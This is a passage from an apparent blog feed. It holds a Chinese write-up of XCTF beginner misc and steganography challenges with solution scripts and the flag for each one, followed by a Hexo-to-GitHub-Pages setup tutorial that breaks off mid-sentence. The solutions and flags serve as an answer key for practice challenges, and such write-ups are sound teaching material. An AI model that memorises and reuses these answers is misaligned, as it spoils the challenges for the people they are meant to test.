href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/M5015d.png" alt="M5015d"></p><p>得到：<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code></p><p>4.Base64解码：<a href="http://ctf.ssleye.com/base64.html">http://ctf.ssleye.com/base64.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/n8uhQ5.png" alt="n8uhQ5"></p><p>得到flag：<code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></p><h2 id="004-give-you-flag">004 give_you_flag</h2><p>【目标】简单密码学</p><p>【环境】windows</p><p>【工具】stegsolve</p><p>【分析过程】</p><p>1、下载附件，打开gif图会看到小龙人数完钞票会展示二维码，使用stegsolve等工具查看帧数得到二维码。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/BDelFH.png" alt="BDelFH"></p><p>二维码缺少三个小方块，而这些小方块被称为定位图案，用于标记二维码矩形的大小，用三个定位图案可以标识并确定一个二维码矩形的位置和方向。</p><p>2、使用工具ps将二维码修复完全便可获得完整二维码，扫描获得flag。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/2.png" alt="2"></p><p>得到flag：<code>flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</code></p><h2 id="005-坚持60s">005 坚持60s</h2><p>下载发现是一个.jar的游戏，使用java反编译工具，查看源码，得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/QTuVfq.png" alt="QTuVfq"></p><p>得到flag：<code>flag&#123;RGFqaURhbGlfSmlud2FuQ2hpamk=&#125;</code> 提交了一下发现不对，仔细一看原来里面还有个base64加密，解密后再提交就可以了，最后flag结果：<code>flag&#123;DajiDali_JinwanChiji&#125;</code></p><h2 id="006-gif">006 gif</h2><p>【目标】简单密码学</p><p>【环境】windows</p><p>【工具】转换二进制为字符串工具</p><p>【分析过程】</p><p>打开文件出现多个黑白，让人联想到二进制，白色图片代表0，黑色图片代表1。</p><p>01100110前八位二进制换算后为 f 证明思路正确。</p><p>于是我们直接上python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">range</span>(<span class="number">104</span>)):</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>)</span><br><span class="line">im = img.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">r,g,b = im.getpixel((<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line"><span class="keyword">if</span> r != <span class="number">255</span>:</span><br><span class="line">result += <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result += <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(result),<span class="number">8</span>):</span><br><span class="line">byte = result[i:i+<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(byte,<span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/C1MS0h.png" alt="C1MS0h"></p><p>得到flag：<code>flag&#123;FuN_giF&#125;</code></p><h2 id="007-掀桌子">007 掀桌子</h2><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/YF6NK0.png" alt="YF6NK0"></p><p>【目标】简单密码学</p><p>【环境】windows</p><p>【工具】python</p><p>【分析过程】</p><p>解密方法，两个一位，16进制转10进制，然后减去128再转成字符即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string), <span class="number">2</span>):</span><br><span class="line">    s = <span class="string">&quot;0x&quot;</span> + string[i] + string[i+<span class="number">1</span>]</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(s, <span class="number">16</span>) - <span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;hjzcydjzbjdcjkzkcugisdchjyjsbdfr&#125;</code></p><h2 id="008-ext3">008 ext3</h2><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/V2NNm9.png" alt="V2NNm9"></p><p>方法一：</p><p>下载附件，放入到Hex Fiend看看，找到flag.txt</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/he4Xzw.png" alt="he4Xzw"></p><p>尝试将目标文件后缀改为zip，进行解压，从而得到文件中的flag.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/v91VJP.png" alt="v91VJP"></p><p>发现flag.txt中base64加密的数据<code>ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/Kzn2by.png" alt="Kzn2by"></p><p>解密后得到flag：<code>flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</code></p><p>方法二：</p><p>1.可以先用file查看一下文件信息，似乎没什么东西</p><p>2.使用strings命令<code>strings linux|grep flag</code>，查看指定文件下有没有flag这样的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/BYzm44.png" alt="BYzm44"></p><p>发现在07avZhikgKgbF目录下有flag.txt文件</p><p>3.root模式下使用<code>mount f1fc23f5c743425d9e0073887c846d23 /mnt</code>命令将linux光盘挂载在mnt目录下，切换到mnt目录，使用<code>cat O7avZhikgKgbF/flag.txt</code>命令即可对flag内容进行读取</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/xbid79.png" alt="xbid79"></p><p>发现是一个base64编码，解密后得到flag.</p><p>flag：<code>flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</code></p><h2 id="009-stegano">009 stegano</h2><p>1.文件下载是一个pdf，使用pdfinfo查看信息，如下所示，Keywords中有一串base64码，解密后发现不是flag：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/DVlanI.png" alt="DVlanI"></p><p>2.打开pdf后直接全选粘贴放在sublime里面，发现有一串的AB，考虑摩斯密码，将A替换为.，B替换为-，再解码即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/M2sgdB.png" alt="M2sgdB"></p><p>3.利用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB &quot;</span> \</span><br><span class="line">    <span class="string">&quot;ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB&quot;</span></span><br><span class="line">mose = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        c = <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">    mose += c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mose)</span><br></pre></td></tr></table></figure><p>4.得到摩尔斯电码：<code>-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--</code></p><p>5.进行解码，得到：<code>1nv151bl3m3554g3</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200629121322867.png" alt="image-20200629121322867"></p><p>6.根据题目要求是小写，提交flag：<code>flag&#123;1nv151bl3m3554g3&#125;</code></p><h2 id="010-SimpleRAR">010 SimpleRAR</h2><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/Eenvqd.png" alt="Eenvqd"></p><p>1.将压缩包直接解压，发现压缩包损坏，但得到了一个flag.txt</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/v81IvN.png" alt="v81IvN"></p><p>2.根据提示flag不在这，那应该在剩余的文件中，将压缩包用winHex打开发现应该有png文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/TIJg7w.png" alt="TIJg7w"></p><p>3.根据flag.txt的内容，补齐图片格式将A8 3C 7A改为A8 3C 74后保存，</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/KXpaFO.png" alt="KXpaFO"></p><p>4.再次解压得到一个空白图片，放在winhex下，发现是一个.gif图片，将图片后缀修改为.gif</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/2Q2STV.png" alt="2Q2STV"></p><p>5.用PhotoShop打开，发现有两个空白的图层</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/tgpf9s.png" alt="tgpf9s"></p><p>6.将两个图层分别提取出来，用StegSolve打开，不断点击箭头直到显示出二维码</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/ibgD06.png" alt="ibgD06"></p><p>7.使用stegsolve帧功能模块，得到两张不同的帧图片，调节颜色，得到两张残缺的二维码图片，合并补齐后，扫一扫即可。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/4lA1tr.png" alt="4lA1tr"></p><p>8.然后扫描就看到flag啦:<code>flag&#123;yanji4n_bu_we1shi&#125;</code></p><h2 id="011-base64stego">011 base64stego</h2><p>【目标】base64 隐写</p><p>【环境】python</p><p>【工具】python</p><p>【分析过程】</p><p>无法直接解压压缩包，将其放在winhex下，查找查找<code>504B</code>标志位，发现是一个ZIP伪加密,将第二个504B后的0900改为0000</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/4STOhT.png" alt="4STOhT"></p><p>解压得到一个内容全是base64编码的文件</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/dFLbSu.png" alt="dFLbSu"></p><p>发现是base64文件隐写，python2环境下直接利用脚本即可解出flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;stego.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]) </span><br></pre></td></tr></table></figure><p>运行的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/cj0iaC.png" alt="cj0iaC"></p><p>提交flag：<code>flag&#123;Base_sixty_four_point_five&#125;</code></p><h2 id="012-功夫再高也怕菜刀">012 功夫再高也怕菜刀</h2><p>1.使用binwalk 查看该文件，可以看到里面有一个压缩包。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/YljxhC.png" alt="YljxhC"></p><p>2.用foremost工具分离该文件,在输出结果中分离出一个压缩包,里面有一个flag.txt文件</p><p>3.打开wireshark分析数据包，<code>分组字节流</code>搜索<code>字符串flag.txt</code>，发现6666.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/6ZVD8P.png" alt="6ZVD8P"></p><p>4.追踪TCP流，找到jpg文件的文件头(FFD8)和文件尾(FFD9)并复制</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200629123538298.png" alt="image-20200629123538298"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200629123327470.png" alt="image-20200629123327470"></p><p>5.用Hex Fiend新建文件，将复制内容粘贴为Ascll Hex 格式并保存，保存为jpg格式，可以得到图片，</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200629123556077.png" alt="image-20200629123556077"></p><p>6.得到压缩包解压密码：<code>Th1s_1s_p4sswd_!!!</code>，打开flag.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200629124017386.png" alt="image-20200629124017386"></p><p>7.得到flag：<code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0到1部署Hexo博客</title>
      <link href="/posts/a1d73a0e/"/>
      <url>/posts/a1d73a0e/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是-Hexo？">什么是 Hexo？</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216183017972.png" alt="image-20210216183017972"></p><h2 id="安装">安装</h2><p>安装 Hexo 只需几分钟时间，若您在安装过程中遇到问题或无法找到解决方式，请<a href="https://github.com/hexojs/hexo/issues">提交问题</a>，我们会尽力解决您的问题。</p><h3 id="安装前提">安装前提</h3><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li></ul><p>如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 <a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Hexo">安装 Hexo</a> 步骤。</p><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><h3 id="安装-Git">安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/">Homebrew</a>, <a href="http://www.macports.org/">MacPorts</a> 或者下载 <a href="http://sourceforge.net/projects/git-osx-installer/">安装程序</a>。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></li></ul><blockquote><p><strong>Mac 用户</strong></p><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <strong>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</strong> 安装命令行工具。</p></blockquote><blockquote><p><strong>Windows 用户</strong></p><p>对于中国大陆地区用户，可以前往 <a href="https://npm.taobao.org/mirrors/git-for-windows/">淘宝 Git for Windows 镜像</a> 下载 git 安装包。</p></blockquote><h3 id="安装-Node-js">安装 Node.js</h3><p>Node.js 为大多数平台提供了官方的 <a href="https://nodejs.org/en/download/">安装程序</a>。对于中国大陆地区用户，可以前往 <a href="https://npm.taobao.org/mirrors/node">淘宝 Node.js 镜像</a> 下载。</p><p>其它的安装方法：</p><ul><li>Windows：通过 <a href="https://github.com/jasongin/nvs/">nvs</a>（推荐）或者<a href="https://github.com/nvm-sh/nvm">nvm</a> 安装。</li><li>Mac：使用 <a href="https://brew.sh/">Homebrew</a> 或 <a href="http://www.macports.org/">MacPorts</a> 安装。</li><li>Linux（DEB/RPM-based）：从 <a href="https://github.com/nodesource/distributions">NodeSource</a> 安装。</li><li>其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 <a href="https://nodejs.org/en/download/package-manager/">指导</a></li></ul><p>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。</p><blockquote><p><strong>Windows 用户</strong></p><p>使用 Node.js 官方安装程序时，请确保勾选 <strong>Add to PATH</strong> 选项（默认已勾选）</p></blockquote><blockquote><p><strong>For Mac / Linux 用户</strong></p><p>如果在尝试安装 Hexo 的过程中出现 <code>EACCES</code> 权限错误，请遵循 <a href="https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally">由 npmjs 发布的指导</a> 修复该问题。强烈建议 <strong>不要</strong> 使用 root、sudo 等方法覆盖权限</p></blockquote><blockquote><p><strong>Linux</strong></p><p>If you installed Node.js using Snap, you may need to manually run <code>npm install</code> in the target folder when <a href="https://hexo.io/docs/commands#init">initializing</a> a blog.</p></blockquote><h3 id="安装-Hexo">安装 Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完成后可用<code>hexo -v</code>查看一下版本</p><p>至此就全部安装完了。</p><h3 id="进阶安装和使用">进阶安装和使用</h3><p>对于熟悉 npm 的进阶用户，可以仅局部安装 <code>hexo</code> 包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure><p>安装以后，可以使用以下两种方式执行 Hexo：</p><ol><li><p><code>npx hexo &lt;command&gt;</code></p></li><li><p>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27;</span> &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure><h3 id="Node-js-版本限制">Node.js 版本限制</h3><p>我们强烈建议永远安装最新版本的 Hexo，以及 <a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85%E5%89%8D%E6%8F%90">推荐的 Node.js 版本</a>。</p><table><thead><tr><th style="text-align:left">Hexo 版本</th><th style="text-align:left">最低兼容 Node.js 版本</th></tr></thead><tbody><tr><td style="text-align:left">5.0+</td><td style="text-align:left">10.13.0</td></tr><tr><td style="text-align:left">4.1 - 4.2</td><td style="text-align:left">8.10</td></tr><tr><td style="text-align:left">4.0</td><td style="text-align:left">8.6</td></tr><tr><td style="text-align:left">3.3 - 3.9</td><td style="text-align:left">6.9</td></tr><tr><td style="text-align:left">3.2 - 3.3</td><td style="text-align:left">0.12</td></tr><tr><td style="text-align:left">3.0 - 3.1</td><td style="text-align:left">0.10 or iojs</td></tr><tr><td style="text-align:left">0.0.1 - 2.8</td><td style="text-align:left">0.10</td></tr></tbody></table><h2 id="初始化">初始化</h2><p>首先，进入一个你在本机存放Hexo Blog的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Volumes/Data/XXX    //这是你的文件存放路径</span><br><span class="line">hexo init hexoblog      //hexoblog可以自己取文件夹名</span><br><span class="line"><span class="built_in">cd</span> hexoblog             //进入这个hexoblog文件夹</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹目录下有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tree -L 1</span><br><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── node_modules</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">└── themes</span><br><span class="line"></span><br><span class="line">4 directories, 3 files</span><br></pre></td></tr></table></figure><p>接下来，生成博客文件并本机预览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>打开hexo的服务，在浏览器输入<code>localhost:4000</code>就可以看到你生成的博客了。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216183317119.png" alt="image-20210216183317119"></p><h2 id="创建仓库及添加SSH">创建仓库及添加SSH</h2><p>首先，你先要拥有一个GitHub账户，没有就去注册一个吧。</p><p>注册完登录后，在GitHub.com中<code>➕</code>号中看到一个New repository，新建仓库</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216183504861.png" alt="image-20210216183504861"></p><p>创建一个和你用户名相同的仓库，用户名后面加上<code>.github.io</code>，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是如果用户名是user，则新建的仓库名为<code>user.github.io</code>，其中<code>abcd</code>就是你注册GitHub的用户名。</p><p>点击<code>Create repository</code>。</p><p><strong>添加SSH到Github中</strong></p><p>在你自己的机器中控制台中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure><p>这里的<code>yourname</code>输入你的GitHub用户名，<code>youremail</code>输入你GitHub的提交邮箱。这样GitHub才能知道你是不是对应它的账户。</p><p>可以用以下两条，检查一下你有没有输对</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p>然后创建SSH,一路回车</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure><p>这个时候它会告诉你已经生成了.ssh的文件夹。在你的电脑中找到这个文件夹。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216183918185.png" alt="image-20210216183918185"></p><p>SSH，简单来讲，就是一个秘钥，其中，<code>id_rsa</code>是你这台电脑的私人秘钥，不能给别人看的，<code>id_rsa.pub</code>是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。</p><p>而后在GitHub的setting中，找到SSH keys的设置选项，点击<code>New SSH key</code>把你的<code>id_rsa.pub</code>里面的信息复制进去。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210216184102048.png" alt="image-20210216184102048"></p><p>在gitbash中，查看是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>提示下面内容则为验证成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi ollyhsu! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><h2 id="hexo部署到GitHub">hexo部署到GitHub</h2><p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 <code>_config.yml</code>，翻到最后，修改为<code>YourgithubName</code>就是你的GitHub账户</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:YourgithubName/YourgithubName.github.io.git</span></span><br><span class="line">    <span class="comment">#coding: git@e.coding.net:YourTeamName/YourName/YourName.git</span></span><br><span class="line">    <span class="comment">#gitee: git@gitee.com:YourName/YourName.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean         //清除之前生成的文件</span><br><span class="line">hexo generate      //生成静态文章，可以用 hexo g 缩写</span><br><span class="line">hexo deploy        //推送博客文件，可以用hexo d缩写</span><br></pre></td></tr></table></figure><p>注意deploy时如果使用HTTPS远程链接可能要你输入username和password。</p><p>得到<code>INFO  Deploy done: git</code>就说明部署成功了，过一会儿就可以在<code>http://yourname.github.io</code> 这个网站看到你的博客了！！</p><h2 id="设置个人域名">设置个人域名</h2><p>现在你的个人网站的地址是 <code>yourname.github.io</code>，如果觉得这个网址逼格不太够，这就需要你设置个人域名了。但是需要花钱。</p><p>注册一个阿里云账户，在阿里云或者腾讯云上买一个域名，我买的是 